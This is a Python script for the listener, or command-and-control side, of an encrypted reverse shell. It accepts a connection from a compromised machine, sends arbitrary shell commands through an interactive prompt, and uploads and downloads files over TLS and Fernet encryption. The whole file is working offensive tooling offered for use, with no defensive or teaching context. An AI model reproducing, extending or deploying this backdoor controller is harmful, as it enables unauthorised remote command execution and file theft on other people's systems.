#!/usr/bin/python 
import socket
import json
import base64
import argparse
import os
import ssl
import logging
from cryptography.fernet import Fernet

class Listener:
    def __init__(self, ip, port, key):
        self.key = key
        self.cipher = Fernet(key)
        
        # Configure logging
        logging.basicConfig(filename='listener.log', level=logging.INFO, 
                            format='%(asctime)s - %(levelname)s - %(message)s')

        # Create and configure the socket
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(5)
        logging.info(f"Listening on {ip}:{port}")
        
        # Accept connection
        self.connection, address = listener.accept()
        logging.info(f"Connection established with {address}")
        
        # Wrap socket with SSL for encryption
        self.connection = ssl.wrap_socket(self.connection, server_side=True, certfile='cert.pem', keyfile='key.pem')
        logging.info("SSL/TLS encryption established.")

    def json_send(self, data):
        try:
            encrypted_data = self.cipher.encrypt(json.dumps(data).encode())
            self.connection.send(encrypted_data)
            logging.info(f"Sent data: {data}")
        except Exception as e:
            logging.error(f"Error sending data: {e}")

    def json_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                decrypted_data = self.cipher.decrypt(json_data).decode()
                logging.info(f"Received data: {decrypted_data}")
                return json.loads(decrypted_data)
            except ValueError:
                continue
            except Exception as e:
                logging.error(f"Error receiving data: {e}")
                break

    def exec_remote(self, command):
        self.json_send(command)
        if command[0] == "exit":
            self.connection.close()
            logging.info("Connection closed.")
            exit()
        return self.json_receive()

    def write_file(self, path, content):
        try:
            with open(path, 'wb') as file:
                file.write(base64.b64decode(content))
            logging.info(f"File downloaded successfully: {path}")
            return "[+] Download successful."
        except Exception as e:
            logging.error(f"Error writing file: {e}")
            return f"[-] Error writing file: {e}"

    def read_file(self, path):
        try:
            with open(path, 'rb') as file:
                encoded_content = base64.b64encode(file.read())
            logging.info(f"File read successfully: {path}")
            return encoded_content
        except Exception as e:
            logging.error(f"Error reading file: {e}")
            return f"[-] Error reading file: {e}"

    def run(self):
        while True:
            command = input(">> ").split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1]).decode()
                    command.append(file_content)

                result = self.exec_remote(command)

                if command[0] == "download" and "[-] Error " not in result:
                    self.write_file(command[1], result)
            except Exception as e:
                result = f"[-] Error: {e}"
                logging.error(result)
            print(result)

def generate_key():
    return Fernet.generate_key()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="A flexible and secure listener for remote command execution.")
    parser.add_argument("--ip", required=True, help="IP address to bind the listener.")
    parser.add_argument("--port", required=True, type=int, help="Port number to bind the listener.")
    parser.add_argument("--key", help="Encryption key (Base64 encoded).")
    args = parser.parse_args()

    # Use the provided key or generate a new one
    key = args.key.encode() if args.key else generate_key()

    listener = Listener(args.ip, args.port, key)
    listener.run()
